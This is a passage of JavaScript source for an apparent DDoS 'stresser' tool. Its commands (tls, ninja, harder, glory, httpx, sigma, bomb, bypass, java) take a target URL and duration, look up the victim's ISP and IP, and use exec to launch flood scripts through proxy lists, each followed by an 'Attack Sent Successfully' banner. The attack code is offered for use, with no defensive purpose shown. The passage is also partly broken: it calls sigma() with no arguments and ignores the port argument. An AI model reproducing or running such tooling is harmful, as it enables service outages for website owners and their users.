⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀

========================================================================
 \x1b[1;37m  Attacks Details
\x1b[1;37m      Status:     [\x1b[1;32m Attack Sent Successfully All Server \x1b[1;37m]
\x1b[1;37m      Host:       [\x1b[1m\x1b[36m ${target}  \x1b[1;37m]
\x1b[1;37m      Port:       [\x1b[1m\x1b[36m 443 \x1b[1;37m]
\x1b[1;37m      Time:       [\x1b[1m\x1b[36m ${duration} \x1b[1;37m]
\x1b[1;37m      Methods:    [\x1b[1m\x1b[36m tls \x1b[1;37m]
\x1b[1;37m  Target Details
\x1b[1;37m      ASN:        [\x1b[1m\x1b[36m ${result.as} \x1b[1;37m]
\x1b[1;37m      ISP:        [\x1b[1m\x1b[36m ${result.isp} \x1b[1;37m]
\x1b[1;37m      IP:        [\x1b[1m\x1b[36m ${result.query} \x1b[1;37m]
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `/lib/cache/3`);
exec(`node ${metode} ${target} ${duration} 100 10`)
sigma()
};
// [========================================] //
async function ninja(args) {
  if (args.length < 3) {
    console.log(`Example: .ninja <target> <port>  <duration>
ninja https://contoh.com 443 60`);
    sigma();
	return
  }
 const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;

console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀

========================================================================
 \x1b[1;37m  Attacks Details
\x1b[1;37m      Status:     [\x1b[1;32m Attack Sent Successfully All Server \x1b[1;37m]
\x1b[1;37m      Host:       [\x1b[1m\x1b[36m ${target}  \x1b[1;37m]
\x1b[1;37m      Port:       [\x1b[1m\x1b[36m 443 \x1b[1;37m]
\x1b[1;37m      Time:       [\x1b[1m\x1b[36m ${duration} \x1b[1;37m]
\x1b[1;37m      Methods:    [\x1b[1m\x1b[36m ninja \x1b[1;37m]
\x1b[1;37m  Target Details
\x1b[1;37m      ASN:        [\x1b[1m\x1b[36m ${result.as} \x1b[1;37m]
\x1b[1;37m      ISP:        [\x1b[1m\x1b[36m ${result.isp} \x1b[1;37m]
\x1b[1;37m      IP:        [\x1b[1m\x1b[36m ${result.query} \x1b[1;37m]
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `/lib/cache/1`);
exec(`node ${metode} ${target} ${duration}`)
sigma()
};
// [========================================] //
async function harder(args) {
  if (args.length < 3) {
    console.log(`Example: .harder <target> <port>  <duration>
harder https://contoh.com 443 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;

console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀

========================================================================
 \x1b[1;37m  Attacks Details
\x1b[1;37m      Status:     [\x1b[1;32m Attack Sent Successfully All Server \x1b[1;37m]
\x1b[1;37m      Host:       [\x1b[1m\x1b[36m ${target}  \x1b[1;37m]
\x1b[1;37m      Port:       [\x1b[1m\x1b[36m 443 \x1b[1;37m]
\x1b[1;37m      Time:       [\x1b[1m\x1b[36m ${duration} \x1b[1;37m]
\x1b[1;37m      Methods:    [\x1b[1m\x1b[36m harder \x1b[1;37m]
\x1b[1;37m  Target Details
\x1b[1;37m      ASN:        [\x1b[1m\x1b[36m ${result.as} \x1b[1;37m]
\x1b[1;37m      ISP:        [\x1b[1m\x1b[36m ${result.isp} \x1b[1;37m]
\x1b[1;37m      IP:        [\x1b[1m\x1b[36m ${result.query} \x1b[1;37m]
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `/lib/cache/4`);
exec(`node ${metode} ${target} ${duration} 32 10 proxy.txt`)
sigma()
};
// [========================================] //
async function glory(args) {
  if (args.length < 3) {
    console.log(`Example: .glory <target> <port>  <duration>
glory https://contoh.com 443 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;
console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀

========================================================================
 \x1b[1;37m  Attacks Details
\x1b[1;37m      Status:     [\x1b[1;32m Attack Sent Successfully All Server \x1b[1;37m]
\x1b[1;37m      Host:       [\x1b[1m\x1b[36m ${target}  \x1b[1;37m]
\x1b[1;37m      Port:       [\x1b[1m\x1b[36m 443 \x1b[1;37m]
\x1b[1;37m      Time:       [\x1b[1m\x1b[36m ${duration} \x1b[1;37m]
\x1b[1;37m      Methods:    [\x1b[1m\x1b[36m glory \x1b[1;37m]
\x1b[1;37m  Target Details
\x1b[1;37m      ASN:        [\x1b[1m\x1b[36m ${result.as} \x1b[1;37m]
\x1b[1;37m      ISP:        [\x1b[1m\x1b[36m ${result.isp} \x1b[1;37m]
\x1b[1;37m      IP:        [\x1b[1m\x1b[36m ${result.query} \x1b[1;37m]
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `/lib/cache/5`);
exec(`node ${metode} ${target} ${duration} 32 8 proxy.txt`)
sigma()
};
// [========================================] //
async function httpx(args) {
  if (args.length < 3) {
    console.log(`Example: .httpx <target> <port>  <duration>
httpx https://contoh.com 443 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;

console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀

========================================================================
 \x1b[1;37m  Attacks Details
\x1b[1;37m      Status:     [\x1b[1;32m Attack Sent Successfully All Server \x1b[1;37m]
\x1b[1;37m      Host:       [\x1b[1m\x1b[36m ${target}  \x1b[1;37m]
\x1b[1;37m      Port:       [\x1b[1m\x1b[36m 443 \x1b[1;37m]
\x1b[1;37m      Time:       [\x1b[1m\x1b[36m ${duration} \x1b[1;37m]
\x1b[1;37m      Methods:    [\x1b[1m\x1b[36m httpx \x1b[1;37m]
\x1b[1;37m  Target Details
\x1b[1;37m      ASN:        [\x1b[1m\x1b[36m ${result.as} \x1b[1;37m]
\x1b[1;37m      ISP:        [\x1b[1m\x1b[36m ${result.isp} \x1b[1;37m]
\x1b[1;37m      IP:        [\x1b[1m\x1b[36m ${result.query} \x1b[1;37m]
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `/lib/cache/6`);
exec(`node ${metode} ${target} ${duration} 9 3 proxy.txt`)
sigma()
};
// [========================================] //
async function sigma(args) {
  if (args.length < 3) {
    console.log(`Example: .sigma <target> <port>  <duration>
sigma https://contoh.com 443 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;
console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀

========================================================================
 \x1b[1;37m  Attacks Details
\x1b[1;37m      Status:     [\x1b[1;32m Attack Sent Successfully All Server \x1b[1;37m]
\x1b[1;37m      Host:       [\x1b[1m\x1b[36m ${target}  \x1b[1;37m]
\x1b[1;37m      Port:       [\x1b[1m\x1b[36m 443 \x1b[1;37m]
\x1b[1;37m      Time:       [\x1b[1m\x1b[36m ${duration} \x1b[1;37m]
\x1b[1;37m      Methods:    [\x1b[1m\x1b[36m sigma \x1b[1;37m]
\x1b[1;37m  Target Details
\x1b[1;37m      ASN:        [\x1b[1m\x1b[36m ${result.as} \x1b[1;37m]
\x1b[1;37m      ISP:        [\x1b[1m\x1b[36m ${result.isp} \x1b[1;37m]
\x1b[1;37m      IP:        [\x1b[1m\x1b[36m ${result.query} \x1b[1;37m]
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `/lib/cache/7`);
exec(`node ${metode} ${target} ${duration} 32 10 proxy.txt`)
sigma()
};
// [========================================] //
async function bomb(args) {
  if (args.length < 3) {
    console.log(`Example: .bomb <target> <port>  <duration>
bomb https://contoh.com 443 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;
console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀

========================================================================
 \x1b[1;37m  Attacks Details
\x1b[1;37m      Status:     [\x1b[1;32m Attack Sent Successfully All Server \x1b[1;37m]
\x1b[1;37m      Host:       [\x1b[1m\x1b[36m ${target}  \x1b[1;37m]
\x1b[1;37m      Port:       [\x1b[1m\x1b[36m 443 \x1b[1;37m]
\x1b[1;37m      Time:       [\x1b[1m\x1b[36m ${duration} \x1b[1;37m]
\x1b[1;37m      Methods:    [\x1b[1m\x1b[36m bomb \x1b[1;37m]
\x1b[1;37m  Target Details
\x1b[1;37m      ASN:        [\x1b[1m\x1b[36m ${result.as} \x1b[1;37m]
\x1b[1;37m      ISP:        [\x1b[1m\x1b[36m ${result.isp} \x1b[1;37m]
\x1b[1;37m      IP:        [\x1b[1m\x1b[36m ${result.query} \x1b[1;37m]

`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `/lib/cache/8`);
exec(`node ${metode} ${target} ${duration} 64 10 proxy.txt`)
sigma()
};
// [========================================] //
async function bypass(args) {
  if (args.length < 3) {
    console.log(`Example: .bypass <target> <port>  <duration>
bypass https://contoh.com 443 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;
console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀

========================================================================
 \x1b[1;37m  Attacks Details
\x1b[1;37m      Status:     [\x1b[1;32m Attack Sent Successfully All Server \x1b[1;37m]
\x1b[1;37m      Host:       [\x1b[1m\x1b[36m ${target}  \x1b[1;37m]
\x1b[1;37m      Port:       [\x1b[1m\x1b[36m 443 \x1b[1;37m]
\x1b[1;37m      Time:       [\x1b[1m\x1b[36m ${duration} \x1b[1;37m]
\x1b[1;37m      Methods:    [\x1b[1m\x1b[36m bypass \x1b[1;37m]
\x1b[1;37m  Target Details
\x1b[1;37m      ASN:        [\x1b[1m\x1b[36m ${result.as} \x1b[1;37m]
\x1b[1;37m      ISP:        [\x1b[1m\x1b[36m ${result.isp} \x1b[1;37m]
\x1b[1;37m      IP:        [\x1b[1m\x1b[36m ${result.query} \x1b[1;37m]
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `/lib/cache/9`);
exec(`node ${metode} ${target} ${duration} 32 10 proxy.txt`)
sigma()
};
// [========================================] //
async function java(args) {
  if (args.length < 3) {
    console.log(`Example: .java <target> <port>  <duration>
java https://contoh.com 443 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;
console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞
